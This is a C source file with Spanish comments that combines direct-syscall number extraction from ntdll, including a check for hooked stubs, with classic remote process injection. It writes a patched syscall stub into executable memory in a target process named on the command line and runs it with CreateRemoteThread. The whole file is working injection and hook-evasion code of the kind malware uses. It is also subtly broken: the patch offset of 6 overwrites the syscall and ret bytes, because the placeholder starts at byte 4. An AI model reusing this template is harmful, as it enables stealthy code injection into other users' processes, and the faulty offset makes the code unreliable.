// injector.c — Combina Direct Syscall + Process Injection
// Resuelve el SSN de NtAllocateVirtualMemory y lo inyecta como shellcode
// en un proceso remoto (ej. notepad.exe).
#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>

// Plantilla de shellcode: instrucciones del syscall directo.
// El SSN se parchea en el offset 6 (después de "mov eax, ").
// Bytes:  4C 8B D1          mov r10, rcx
//         B8 XX XX XX XX    mov eax, <SSN>   <-- offset 6 = inicio del SSN
//         0F 05             syscall
//         C3                ret
unsigned char shellcode_template[] = {
    0x4C, 0x8B, 0xD1,               // mov r10, rcx
    0xB8, 0x00, 0x00, 0x00, 0x00,   // mov eax, 0x00000000  (placeholder)
    0x0F, 0x05,                     // syscall
    0xC3                            // ret
};
#define SSN_OFFSET 6  // El SSN empieza en el byte 6

// Misma lógica que en direct_syscall.c
static DWORD ExtractSSN(void) {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    BYTE *fn = (BYTE*)GetProcAddress(ntdll, "NtAllocateVirtualMemory");

    if (!(fn[0] == 0x4C && fn[1] == 0x8B && fn[2] == 0xD1 && fn[3] == 0xB8)) {
        printf("ERROR: firma del stub inesperada. Posible hook.\n");
        return 0;
    }
    return *(DWORD*)(fn + 4);
}

DWORD FindProcessId(const char *processName) {
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 pe = { .dwSize = sizeof(PROCESSENTRY32) };
    DWORD pid = 0;
    if (Process32First(snapshot, &pe)) {
        do {
            if (_stricmp(pe.szExeFile, processName) == 0) {
                pid = pe.th32ProcessID;
                break;
            }
        } while (Process32Next(snapshot, &pe));
    }
    CloseHandle(snapshot);
    return pid;
}

int main(int argc, char **argv) {
    if (argc < 2) { printf("Uso: %s <proceso>\n", argv[0]); return 1; }

    // 1. Resolver el SSN
    DWORD ssn = ExtractSSN();
    if (ssn == 0) { printf("No se pudo extraer SSN.\n"); return 1; }
    printf("SSN extraido: 0x%X\n", ssn);

    // 2. Parchear el shellcode con el SSN real
    memcpy(&shellcode_template[SSN_OFFSET], &ssn, sizeof(DWORD));
    printf("Shellcode parcheado con SSN 0x%X en offset %d\n", ssn, SSN_OFFSET);

    // 3. Encontrar el proceso objetivo
    DWORD pid = FindProcessId(argv[1]);
    if (pid == 0) { printf("Proceso '%s' no encontrado.\n", argv[1]); return 1; }
    printf("Proceso objetivo: %s (PID %lu)\n", argv[1], pid);

    // 4. Abrir el proceso
    HANDLE hProcess = OpenProcess(
        PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_CREATE_THREAD,
        FALSE, pid
    );
    if (!hProcess) { printf("OpenProcess fallo: %lu\n", GetLastError()); return 1; }

    // 5. Reservar memoria remota
    LPVOID remoteBuf = VirtualAllocEx(
        hProcess, NULL, sizeof(shellcode_template),
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE
    );
    if (!remoteBuf) { printf("VirtualAllocEx fallo: %lu\n", GetLastError()); CloseHandle(hProcess); return 1; }

    // 6. Escribir el shellcode parcheado
    if (!WriteProcessMemory(hProcess, remoteBuf, shellcode_template, sizeof(shellcode_template), NULL)) {
        printf("WriteProcessMemory fallo: %lu\n", GetLastError()); CloseHandle(hProcess); return 1;
    }

    // 7. Crear hilo remoto
    HANDLE hThread = CreateRemoteThread(
        hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuf, NULL, 0, NULL
    );
    if (!hThread) { printf("CreateRemoteThread fallo: %lu\n", GetLastError()); CloseHandle(hProcess); return 1; }

    printf("Inyeccion de Direct Syscall completada en %s (PID %lu)\n", argv[1], pid);
    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);
    CloseHandle(hProcess);
    return 0;
}